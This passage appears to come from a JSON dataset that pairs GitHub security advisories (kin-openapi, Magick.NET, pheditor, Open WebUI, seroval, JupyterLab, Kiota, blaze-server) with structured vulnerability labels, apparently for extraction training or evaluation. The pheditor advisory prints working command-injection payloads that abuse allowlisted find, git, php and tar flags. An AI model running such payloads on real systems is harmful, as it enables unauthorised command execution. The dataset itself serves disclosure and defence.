dereference\ngithub.com/getkin/kin-openapi/openapi3filter.defaultContentParameterDecoder(...)\n\topenapi3filter/req_resp_decoder.go:197\ngithub.com/getkin/kin-openapi/openapi3filter.decodeContentParameter(...)\n\topenapi3filter/req_resp_decoder.go:166\ngithub.com/getkin/kin-openapi/openapi3filter.ValidateParameter(...)\n\topenapi3filter/validate_request.go:177\ngithub.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)\n\topenapi3filter/validate_request.go:83\n```\n\nSwapping the media type for one that carries a schema (`application/json: {schema: {type: object}}`) makes the same request return a clean `400` instead of panicking, confirming the missing schema is the cause.\n\n### Impact\n\nThis is an **unauthenticated remote denial of service** (CWE-476) against any service that validates incoming requests with `openapi3filter` and serves a spec containing at least one `content` parameter whose media type lacks a `schema`.\n\nThe precise consequence depends on which goroutine runs the panic and whether a `recover()` covers it:\n\n| Wiring | Recovered by `net/http`? | Result |\n|---|---|---|\n| Synchronous middleware / handler on `net/http` (incl. `openapi3filter.ValidationHandler`) | Yes | Process survives; the one request is aborted. A remote unauthenticated party can still drive connection churn + unbounded `http: panic serving` log growth. |\n| `ValidateRequest` on an app-spawned goroutine (fan-out, `errgroup`, async pre-check) | No | **Whole process crashes** on a single unauthenticated request unless the app added its own `recover()`. |\n| Non-`net/http` host (fasthttp adaptor, gRPC-gateway shim, CLI, offline/batch spec validator) | No | **Whole process crashes.** |\n\nThis is why the suggested CVSS uses `A:L` (Base 5.3): under the recommended synchronous `net/http` wiring the panic is recovered per-connection. Reviewers may reasonably raise it to `A:H` (Base 7.5) for the spawned-goroutine and non-`net/http` integrations, where a single request kills the process.\n\n---\n\n## Remediation (suggested)\n\nAdd a `mt.Schema == nil` guard mirroring the existing `mt == nil` guard, so a schema-less content parameter yields a clean validation error instead of a panic:\n\n```go\nmt := content.Get(\"application/json\")\nif mt == nil {\n    err = fmt.Errorf(\"parameter %q has no content schema\", param.Name)\n    return\n}\nif mt.Schema == nil {\n    err = fmt.Errorf(\"parameter %q content media type has no schema\", param.Name)\n    return\n}\noutSchema = mt.Schema.Value\n```\n\nThe `unmarshal` closure immediately below already tolerates a nil schema (it checks `paramSchema != nil`), so returning early on nil `mt.Schema` is consistent with surrounding intent.\n\n**Workarounds for consumers, pending a patch:**\n\n- Ensure every `content` parameter in served specs declares a `schema`, or reject such specs at load time.\n- Supply a custom `ParamDecoder` that guards `mt.Schema == nil`.\n- Run request validation inside a handler with an explicit `recover()` \u2014 especially if validation runs off the request goroutine or on a non-`net/http` host.\n\n## Notes for the maintainer\n\nThis root cause (`mt.Schema == nil`) is independent of the `Items == nil` panics addressed in `30e2923` and of `GHSA-mmfr-pmjx-hw9w`; no prior fix touched this code path. It affects OpenAPI 3.0.x as well as 3.1.x.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/getkin/kin-openapi",
+              "version_range": "<= 0.143.0"
+            }
+          ],
+          "cwe_category": "NULL Pointer Dereference",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "Unauthenticated clients can crash server with a single request due to NULL-pointer-dereference denial of service in the kin-openapi package.",
+          "remediation_action": "Upgrade to version 0.144.0 or later to fix the vulnerability."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-c4v7-w88g-m6c4",
+    "input_text": "Due to incorrect handling of arguments a heap buffer over-write can occur in the JP2 encoder.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-55597",
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-HDRI-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-AnyCPU",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-arm64",
+              "version_range": "< 14.15.0"
+            }
+          ],
+          "cwe_category": "Incorrect Calculation",
+          "severity": "medium",
+          "attack_vector": "local",
+          "impact_summary": "Heap buffer over-write can lead to arbitrary code execution if not mitigated properly.",
+          "remediation_action": "Implement proper validation and bounds checking on arguments passed to the JP2 encoder."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-g3hq-hphg-8fhh",
+    "input_text": "### Summary\n\npheditor's terminal feature restricts callers to an allowlist of commands (`TERMINAL_COMMANDS`) and rejects shell metacharacters. The allowlist is enforced as a PREFIX match with no argument validation, and the allowlist includes binaries that grant arbitrary command execution through their own options (`find`, `git`, `php`, `tar`, `grep`). A caller can therefore run any command using only allowlisted binaries and no rejected metacharacter, escaping the allowlist restriction the terminal feature relies on.\n\n### Relationship to the prior terminal advisories (this is a surviving, distinct vector)\n\nThe prior terminal advisories were all shell-metacharacter injections: GHSA-9643-6xjp-vx57 (`$()`), GHSA-wg4w-wr5q-6vjc (`|`, backtick, newline), GHSA-jvc5-58fv-w8cq (`;` via the dir field). The current code rejects those characters. This report is a different class \u2014 CWE-88 argument injection through an allowlisted binary's flags \u2014 which the metacharacter denylist does not address.\n\n### Root cause (HEAD, v2.0.6)\n\nIn the `terminal` action handler of `pheditor.php`:\n1. `:588` rejects `&`, `;`, `|`, `$`, backtick, `\\n`, `\\r`. It does NOT reject space, `-`, `{`, `}`, `+`, `/`, `.`.\n2. `:595-605` checks the command against `TERMINAL_COMMANDS` (defined `:25`: `ls,...,php,...,git,find,grep,...,tar,...,composer,exit`) using a PREFIX match: `strlen($command) >= strlen($value) && substr($command, 0, strlen($value)) == $value`. There is no word boundary and no validation of the arguments that follow.\n3. `:617` runs the command through the shell unchanged: `shell_exec((empty($dir) ? null : 'cd ' . escapeshellarg($dir) . ' && ') . $command . ' && echo \\ ; pwd')`.\n\nSo a command beginning with an allowlisted binary, carrying a code-exec flag, and containing none of the rejected characters reaches `shell_exec` intact.\n\n### Proof of concept (reproduced)\n\nPOST to the terminal action with:\n  command = `find . -maxdepth 0 -exec touch /tmp/PWNED {} +`\n  dir = (any)\n\nThis contains no rejected metacharacter, prefix-matches the allowlisted `find`, and `find -exec` runs an arbitrary program. A faithful harness mirroring the three guards (`poc/reproduction.sh`, `poc/transcript.txt`) creates the marker file. Other allowlisted-binary payloads with the same property: `git -c alias.x='!touch /tmp/PWNED' x`, `php -r 'system(\"id\");'`, `tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=\"touch /tmp/PWNED\" .`.\n\n### Impact\n\nArbitrary command execution on the host, under the web server's privileges, for a caller with the `terminal` permission (enabled in the default configuration). The exposure is amplified by GHSA-p4h7-p9rj-2pq2 (hardcoded default `admin` password with no forced change): a default deployment grants the authenticated access needed to reach the terminal action with a single known credential, making the chain effectively unauthenticated RCE.\n\n### Remediation\n\nValidate the FULL command, not just its prefix: tokenize and require the program to be an allowlisted binary AND constrain its arguments (reject `-exec`/`-execdir` for `find`, `-c`/`--upload-pack` for `git`, `-r`/`-d` for `php`, `--checkpoint-action`/`--to-command` for `tar`, `-f`/`--file` program forms, etc.), or run each command as an argv array through a restricted launcher with no shell, or remove the code-exec-capable binaries from the allowlist. A prefix allowlist over a shell sink cannot constrain capability.\n\nCredit: anir0y (independent security research).",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "COMPOSER",
+              "product": "pheditor/pheditor",
+              "version_range": "<= 2.0.6"
+            }
+          ],
+          "cwe_category": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Arbitrary command execution with elevated privileges on the host.",
+          "remediation_action": "Validate the FULL command and constrain its arguments to prevent code-executable forms."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-j657-m4c4-24jq",
+    "input_text": "## Summary\n\nThe terminal proxy in `backend/open_webui/routers/terminals.py` forwards the Open WebUI user's identity to the upstream terminal server / backend coordinator as an authorization claim, with no cryptographic binding to the session that produced it. The forwarded identity is attacker-influenceable on both proxy paths:\n\n1. **HTTP path (`proxy_terminal`)** sets `headers['X-User-Id'] = user.id`. Upstreams that trust `X-User-Id` as identity receive it unsigned, so an attacker who can reach the upstream by other means (directly, a compromised peer, SSRF) can spoof it.\n2. **WebSocket path (`ws_terminal`)** is exploitable through Open WebUI itself, with no \"other means\" required. It interpolates the path parameter `session_id` directly into the upstream URL and then appends `?user_id=<caller>`:\n\n   ```python\n   upstream_url = f'{ws_base}/p/{policy_id}/api/terminals/{session_id}'\n   upstream_url += f'?{urllib.parse.urlencode({\"user_id\": user.id})}'\n   ```\n\n`session_id` is neither validated nor URL-encoded (the HTTP sibling runs `_sanitize_proxy_path`; this path runs nothing). An encoded `?`/`&` smuggled through `session_id` survives Open WebUI's single decode and is re-decoded by the upstream, injecting an attacker-chosen `user_id` ahead of the appended one. Query parsing binds the first occurrence, so the backend coordinator resolves the spoofed user's terminal scope.\n\n## Technical Details\n\nThe forwarded terminal identity is a bearer-style authorization claim with no integrity binding, and on the WebSocket path it is additionally injectable because `session_id` is concatenated into the URL without encoding or delimiter validation.\n\n## Impact\n\nA normal authenticated user can make the terminal proxy present another user's identity to the upstream backend coordinator. On backend coordinator-backed (`policy_id`) servers that scope terminal containers by `user_id`, this reaches another user's terminal scope; combined with a known active session ID (for example a chat-scoped session ID surfaced through a shared chat), it allows attaching to that user's live PTY. The HTTP-path variant additionally allows identity spoofing at the upstream tier for any deployment whose upstream trusts `X-User-Id`.\n\n## Appendix: Affected code\n\n- `backend/open_webui/routers/terminals.py` \u2014 `proxy_terminal` sets `headers['X-User-Id'] = user.id` with no signature.\n- `backend/open_webui/routers/terminals.py` \u2014 `ws_terminal` builds the upstream URL from an unvalidated, unencoded `session_id` and appends `user_id` as a query parameter, allowing query injection.\n\n## Appendix: Consolidation\n\nPer the Report Handling policy, this consolidates independent reports of the same root cause (the forwarded terminal identity is spoofable / not integrity-bound) into the earliest filing:\n\n- **@smoke-wolf** (earliest filing) \u2014 the `X-User-Id` HTTP-path identity is forwarded without integrity binding, spoofable where the upstream trusts the header.\n- **@rexpository** \u2014 the `ws_terminal` `session_id` query-injection vector, proving the forwarded `user_id` is spoofable through the Open WebUI proxy itself, with no \"reach the upstream by other means\" precondition.\n\n## Appendix: Recommended fix\n\n- Validate and URL-encode `session_id` before building the upstream URL (`urllib.parse.quote(session_id, safe=\"\")`; reject `?`, `#`, `&`, `/`, `%`, backslash, control characters). Build the query string with a URL builder so attacker-controlled path content cannot precede it.\n- Bind the forwarded identity instead of passing a raw `user_id` / `X-User-Id`: emit a short-lived signed claim (for example HS256 over `{uid, iat, aud:server_id}` with a key shared only with the specific upstream) and verify it upstream.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59224",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "open-webui",
+              "version_range": "< 0.10.0"
+            }
+          ],
+          "cwe_category": "Improper Authentication",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "A normal authenticated user can spoof another user's identity to the upstream backend coordinator, potentially reaching their terminal scope. ",
+          "remediation_action": "Validate and URL-encode `session_id` before building the upstream URL and bind the forwarded identity with a signed claim."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-mv8w-475r-vwqw",
+    "input_text": "## Summary\n\nA type confusion issue in `seroval.fromJSON()` allowed attacker-controlled JSON input to cause Promise control nodes to operate on values from the general deserialization reference table without first verifying that those values were genuine internal promise resolver records.\n\nIn applications that deserialize untrusted Seroval JSON with plugins enabled, this could allow attacker-controlled deserialization side effects. In downstream server frameworks that register plugins returning callable wrappers, this primitive could become unintended server-side invocation and, depending on exposed application functionality, remote code execution or equivalent server compromise.\n\nThe issue was fixed in `seroval@1.5.3`.\n\n## Affected package\n\n- Package: `seroval`\n- Affected API: `fromJSON()`\n- Affected versions: versions prior to `1.5.3` that contain the vulnerable Promise resolver reference handling\n- Patched version: `1.5.3`\n\n## Impact\n\nThe vulnerable deserialization path could confuse attacker-created values in the general reference table with Seroval's internal promise resolver records.\n\nDirect impact in `seroval` is a deserialization side-effect primitive when untrusted JSON is deserialized with plugins enabled. Downstream impact depends on registered plugins and framework usage. If a downstream framework registers plugins that deserialize sensitive callable wrappers, attacker-controlled input may be able to trigger unintended server-side invocation during deserialization.\n\nA concrete downstream impact scenario was validated privately against TanStack Start before the `1.5.3` fix. With `seroval@1.5.3`, the downstream reproducer no longer succeeds.\n\n## Remediation\n\nUpgrade to `seroval@1.5.3` or later.\n\nDownstream projects that accept Seroval JSON from untrusted clients should also consider defense-in-depth controls:\n\n- restrict accepted Seroval node types for client-to-server payloads;\n- allowlist plugin tags for inbound deserialization;\n- avoid registering plugins that produce callable or privileged values for untrusted inputs unless strictly necessary;\n- add regression tests ensuring deserialization cannot cause unintended server-side invocation as a side effect.\n\n## Fix verification\n\nThe original private reproducer was verified against `seroval@1.5.2` and no longer reproduces against `seroval@1.5.3`.\n\nValidation results:\n\n- `seroval@1.5.2`: vulnerable behavior reproduced.\n- `seroval@1.5.3`: deserialization aborts before the attacker-controlled side effect occurs.\n- TanStack Start downstream proof with `seroval@1.5.3`: no evidence side effect is produced.\n\n## Credit\n\nReported by [Mufeed VH](https://x.com/mufeedvh) from [Winfunc Research](https://winfunc.com).\n\n## Disclosure / coordination note\n\nThe downstream TanStack Start impact was coordinated privately. Technical exploit details and proof-of-concept reproduction material have been omitted from this advisory draft for discretion.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59940",
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "seroval",
+              "version_range": "<= 1.5.2"
+            }
+          ],
+          "cwe_category": "Deserialization of Untrusted Data",
+          "severity": "critical",
+          "attack_vector": "network",
+          "impact_summary": "Untrusted JSON deserialization with plugins enabled could lead to remote code execution or server compromise.",
+          "remediation_action": "Upgrade to `seroval@1.5.3` and implement defense-in-depth controls for downstream frameworks."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-74h3-cxq7-vc5q",
+    "input_text": "## Summary\n\nAn authenticated low-privilege user can execute arbitrary code-interpreter Python and tools inside **another** user's authenticated session. The Socket.IO event-caller (`get_event_call`) delivers `execute:python` / `execute:tool` events to a **client-supplied** `session_id` after only checking that the session is connected, never that it belongs to the requester. Combined with `ydoc:document:join`, which exposes the live socket ids of everyone in a shared note's collaboration room to any read-access participant, an attacker can target a victim's session and run attacker-chosen code/tools in the victim's browser context. When the victim is an administrator, that hijacked context reaches the admin-only Functions API, whose source is executed server-side, yielding remote code execution as the server process (root in the default container).\n\n## Affected component\n\n- `backend/open_webui/socket/main.py` \u2014 `get_event_call()` / `__event_caller__`\n- `backend/open_webui/main.py` \u2014 chat-completion metadata (`session_id` taken from the request body)\n\n## Root cause\n\nThe event-caller routes to a caller-controlled session id with no ownership check:\n\n```python\n# backend/open_webui/socket/main.py \u2014 get_event_call()\nasync def __event_caller__(event_data):\n    session_id = request_info['session_id']\n    if session_id not in SESSION_POOL:                 # only checks the session is connected\n        return {'error': 'Client session disconnected.'}\n    return await sio.call('events', {...}, to=session_id, ...)   # delivered to that sid\n```\n\n`session_id` originates from the request body and is never validated against the authenticated user:\n\n```python\n# backend/open_webui/main.py\nmetadata = {\n    'user_id': user.id,                               # server-derived (trustworthy)\n    'session_id': form_data.pop('session_id', None),  # client-controlled\n    ...\n}\n```\n\n`SESSION_POOL[session_id]` is the user record of whoever owns that socket. Because the caller checks only membership (`in SESSION_POOL`), a request carrying another user's `session_id` causes `execute:python` / `execute:tool` to be delivered to that other user's browser.\n\n## Reachability\n\n- `execute:python` / `execute:tool` are emitted from the code-interpreter and tool-call paths (`utils/middleware.py`, `tools/builtin.py`), all routed through `get_event_call`.\n- The victim's live `session_id` is disclosed to any read-access participant of a shared note via `ydoc:document:join`.\n- `POST /api/v1/chat/completions` requires only `get_verified_user` (the default user role). The attacker uses their own account and a model / Direct Connection they control to choose the payload.\n\n## Impact\n\n- **Any victim:** arbitrary code-interpreter Python and tool execution in the victim's authenticated session \u2014 the attacker acts with the victim's identity and origin (full session/account compromise).\n- **Admin victim:** the hijacked admin context reaches `POST /api/v1/functions/create`, whose source is `exec()`'d server-side \u2192 remote code execution as the server process (root in the default container).\n\nThe Functions API is intended administrator code-execution; the vulnerability here is the cross-user delivery that lets an attacker drive another user's session \u2014 including an admin's \u2014 into it. The primitive is a full session compromise even against non-admin victims.\n\n## Proof of Concept\n\nThe reporter's `exploit.py` reproduced on `ghcr.io/open-webui/open-webui:0.9.6` and a build of the `v0.9.6` tag, confirming blind server-side RCE out-of-band (callback returns `uid=0(root)`), using only a low-privilege `user` account that shared a note with an admin victim. Preconditions: code interpreter enabled; attacker shares a note with the victim; victim opens it while online; admin victim required for server RCE.\n\n## Fix\n\n`get_event_call` must verify the target session belongs to the requesting user before delivering, not merely that it is connected:\n\n```python\nsession = SESSION_POOL.get(session_id)\nif session is None or session.get('id') != request_info.get('user_id'):\n    return {'error': 'Client session disconnected.'}\n```\n\n`user_id` in the request metadata is server-derived from the authenticated user, so it is trustworthy. Restricting `ydoc:document:join` so it does not disclose other participants' socket ids is recommended as defence-in-depth.\n\n## Affected / Patched\n\n- Affected: `< 0.10.0` (last affected release 0.9.6)\n- Patched: v0.10.0. `get_event_call` now verifies the target session belongs to the requesting user before delivering (`session is None or session.get('id') != request_info.get('user_id')`), using the server-derived `user_id` from the request metadata. The recommended `ydoc:document:join` sid-disclosure restriction is defence-in-depth and independent of this fix; the ownership check closes the cross-user delivery regardless of whether the victim's sid is known.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59216",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "open-webui",
+              "version_range": "< 0.10.0"
+            }
+          ],
+          "cwe_category": "Improper Control of Generation of Code ('Code Injection')",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Authenticated low-privilege users can execute arbitrary code-interpreter Python and tools inside another user's session, leading to full session compromise for non-admin victims and server-side RCE for admin victims.",
+          "remediation_action": "Modify `get_event_call` to verify the target session belongs to the requesting user before delivering events."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-m596-67p7-69wh",
+    "input_text": "When an allocation fails in the VIFF encoder a memory leak will occus.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-HDRI-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-AnyCPU",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-arm64",
+              "version_range": "< 14.15.0"
+            }
+          ],
+          "cwe_category": "Missing Release of Memory after Effective Lifetime",
+          "severity": "low",
+          "attack_vector": "local",
+          "impact_summary": "Memory leaks can lead to system instability and resource exhaustion.",
+          "remediation_action": "Ensure proper memory management and handle allocation failures gracefully to avoid leaks."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-73x5-h92w-xc2j",
+    "input_text": "## Summary\n\nA normal authenticated user can read the content of a message in a private channel they do not belong to. `GET /api/v1/channels/{id}/messages/{message_id}/thread` authorizes the caller against the URL channel, but the underlying thread lookup loads the thread *parent* by id and returns it without verifying the parent belongs to that channel. By requesting a thread in a channel they can access while supplying a victim channel's message id as the thread root, the attacker receives the victim message \u2014 content, channel id, and author.\n\n## Affected component\n\n- `backend/open_webui/models/messages.py` \u2014 `get_messages_by_parent_id()`\n- `backend/open_webui/routers/channels.py` \u2014 `get_channel_thread_messages()` (read), `new_message_handler()` (parent/reply binding on write)\n\n## Root cause\n\n`get_messages_by_parent_id(channel_id, parent_id)` filters the thread *replies* by `channel_id`, but loads the thread *parent* by id alone and appends it without requiring `parent.channel_id == channel_id`:\n\n```python\nmessage = await db.get(Message, parent_id)     # loaded by id only \u2014 no channel binding\nif not message:\n    return []\n# replies are filtered by channel_id ...\nif len(all_messages) < limit:\n    all_messages.append(message)               # parent appended unconditionally\n```\n\n`get_channel_thread_messages()` authorizes only the URL channel, then calls `get_messages_by_parent_id(id, message_id)` with the caller-supplied `message_id`. The reply insert path (`new_message_handler` \u2192 `insert_new_message`) also stored a caller-supplied `parent_id` without binding it to the channel.\n\n## Impact\n\nA non-member can disclose the content (plus channel id and author metadata) of a private-channel message whose id they know or obtain. Direct reads of the victim channel/message/thread return 403; the disclosure is via the thread parent of a channel the attacker can access. Read-only, one message per known id.\n\n## Proof of Concept\n\n(reporter) Validated on v0.9.6: `GET /channels/{attacker_channel}/messages/{victim_message_id}/thread` returned the victim's private message \u2014 content, victim channel id, and author \u2014 although direct reads of the victim channel returned 403.\n\n## Fix\n\nBind the thread parent to the requested channel: `get_messages_by_parent_id` returns `[]` unless the parent exists and `parent.channel_id == channel_id`. Defence-in-depth on the write path: `new_message_handler` rejects a supplied `parent_id`/`reply_to_id` whose message does not belong to the URL channel.\n\n## Affected / Patched\n\n- Affected: `< 0.10.0` (last affected release 0.9.6)\n- Patched: v0.10.0 (PR #25766). `get_messages_by_parent_id` binds the thread parent to the requested channel (returns `[]` unless `parent.channel_id == channel_id`), and `new_message_handler` rejects a caller-supplied `parent_id`/`reply_to_id` whose message does not belong to the channel.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59215",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "open-webui",
+              "version_range": "< 0.10.0"
+            }
+          ],
+          "cwe_category": "Authorization Bypass Through User-Controlled Key",
+          "severity": "low",
+          "attack_vector": "network",
+          "impact_summary": "An attacker can read and disclose private messages of a victim channel by manipulating thread parent IDs.",
+          "remediation_action": "Bind the thread parent to the requested channel to prevent unauthorized access."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-h5v5-8746-g7mm",
+    "input_text": "JupyterLab's plugin manager exposes administrator controls intended to prevent users from enabling or disabling selected plugins. Two server-side enforcement gaps let an authenticated user bypass those controls with direct requests to `/lab/api/plugins`.\n\n### Impact\n\nUsers could workaround the plugin manager lock rules via direct API access for either:\n- child plugins of extensions covering multiple plugins\n- when \"lock all\" was issued by the administrator\n\nThe integrity of data can be impacted, and any hardening or restrictions on permitted user actions (e.g. download/upload limits) within the single-user server can be circumvented if those were implemented with plugins that were locked using the faulty mechanisms.\n\n### Patches\n\nJupyterLab [`v4.6.2`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.2) and [`v4.5.10`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.10) contain the patch.\n\nUsers of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.\n\n### Workarounds\n\nManually lock all plugins that should be locked. The core plugin identifiers can be found in [the documentation](https://jupyterlab.readthedocs.io/en/latest/extension/extension_points.html#core-plugins) and identifiers for all installed extensions are listed in the [Plugin Manager](https://jupyterlab.readthedocs.io/en/latest/user/extensions.html#managing-plugins-with-plugin-manager).",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "jupyterlab",
+              "version_range": ">= 4.1.0, <= 4.5.9"
+            },
+            {
+              "vendor": "PIP",
+              "product": "jupyterlab",
+              "version_range": ">= 4.6.0, <= 4.6.1"
+            }
+          ],
+          "cwe_category": "Client-Side Enforcement of Server-Side Security",
+          "severity": "medium",
+          "attack_vector": "unknown",
+          "impact_summary": "Data integrity can be impacted and user actions may be circumvented via API access to plugin management.",
+          "remediation_action": "Manually lock all plugins that should be locked using core plugin identifiers found in documentation."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-jqwh-526h-c92j",
+    "input_text": "# Impact\n\nThe Kiota PHP code generator is vulnerable to a code generation literal injection attack. The generator embeds string values from OpenAPI fields (e.g. `description`, default values, and property names) directly into PHP double-quoted string literals without properly escaping the `$` character. Since PHP evaluates string interpolation expressions like `\"${expr}\"`, `\"$var\"`, and `\"{$obj->prop}\"` within double-quoted strings at runtime, an attacker who controls an OpenAPI specification file can inject arbitrary PHP code into generated model and request-builder classes.\n\n# Who is impacted\n\nDevelopers using Kiota to generate PHP API clients from external or untrusted OpenAPI specifications\n\nTeams with CI/CD pipelines configured to automatically regenerate client code from remote specs\n\nApplications that deploy generated PHP code to production servers\n\n# Vulnerability details\n\nAffected component: `StringExtensions.cs`\n\nRoot cause: The shared `SanitizeDoubleQuote()` function in `Writers/StringExtensions.cs` does not escape the `$` character. As a result, any schema-derived string emitted as a PHP double-quoted literal preserves `$`-prefixed interpolation constructs (`${...}`, `$var`, `{$...}`) verbatim, which PHP evaluates at runtime instead of treating as literal text. This is the same class of code-generation literal-injection flaw previously fixed for the Ruby generator (`#` interpolation), recurring here as a missed variant for PHP's `$` interpolation in the sibling sanitizer helper.\n\n# Attack vectors\n\nOpenAPI `description` and default fields in schema properties\n\nProperty wire-name keys embedded in deserializer/serializer methods\n\nAny schema-derived string embedded in PHP double-quoted literals\n\nSeverity: Critical when generated code reaches production; High for CI/CD environments with access to production secrets; Medium for public third-party specs; Low for developer-controlled specs.\n\n# Patches\n\n[#7863](https://github.com/microsoft/kiota/pull/7863)\n\n# Workarounds\n\nIf you cannot upgrade immediately:\n\n1. Audit and sanitize OpenAPI specifications: Review all OpenAPI specification files for any descriptions, default values, or property names containing the `$` character. Remove or replace any suspicious strings before code generation.\n2. Code review of generated files: Implement mandatory code review of all generated PHP files before merging into any branch. Look for double-quoted strings containing `${`, `$var`, or `{$` patterns.\n3. Restrict specification sources: Only consume OpenAPI specifications from trusted internal sources. Avoid automatic code generation from external or third-party APIs until this patch is applied.\n4. Isolate generated code from production: Do not deploy generated PHP models to production environments unless the specification source has been verified and reviewed.\n5. Manual escaping (temporary): If regeneration is not possible, manually inspect and edit generated files to escape any `$` characters in double-quoted string literals (replace `$` with `\\$`).\n\n# Remediation\n\nUpgrade Kiota to 1.32.4 or later.\n\nRegenerate/refresh existing generated clients as a precaution:\n\nRefreshing generated clients ensures previously generated vulnerable code is replaced with hardened output.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59859",
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Microsoft.OpenApi.Kiota.Builder",
+              "version_range": "< 1.32.4"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Microsoft.OpenApi.Kiota",
+              "version_range": "< 1.32.4"
+            }
+          ],
+          "cwe_category": "Improper Control of Generation of Code ('Code Injection')",
+          "severity": "high",
+          "attack_vector": "unknown",
+          "impact_summary": "Developers and teams using Kiota to generate PHP API clients from external OpenAPI specifications are at risk of code injection attacks.",
+          "remediation_action": "Upgrade Kiota to version 1.32.4 or apply workarounds such as manual escaping or sanitizing generated files."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-46q4-43ph-c6fr",
+    "input_text": "### Summary\n  blaze-server can merge HTTP/1.1 chunked-body trailer fields into `Request.headers`. Because trailer fields are attacker-controlled, an unauthenticated remote client can inject arbitrary header names/values (e.g. `X-Forwarded-For`, internal-auth headers) that a fronting proxy sanitized from the request-header section, bypassing header-based trust decisions in the application.\n\n  ### Impact\n  Any http4s application using `BlazeServerBuilder` over HTTP/1.1 whose routes or middleware trust proxy-set headers (e.g., `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, org-internal auth headers) is affected. Where a fronting proxy strips/normalizes those headers but forwards chunked bodies with trailers intact, an attacker can spoof client IP for allow-lists/rate-limits/audit, forge the `https` scheme, or inject internal-auth headers. A promoted `Connection: close` trailer is also honored, allowing attacker-controlled termination of pooled backend connections.\n\n  ### Workarounds\n  Deploy behind a proxy that removes trailer fields (or rejects requests that use trailers) before forwarding; until patched, avoid trust decisions based on headers that a proxy is relied upon to sanitize.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "MAVEN",
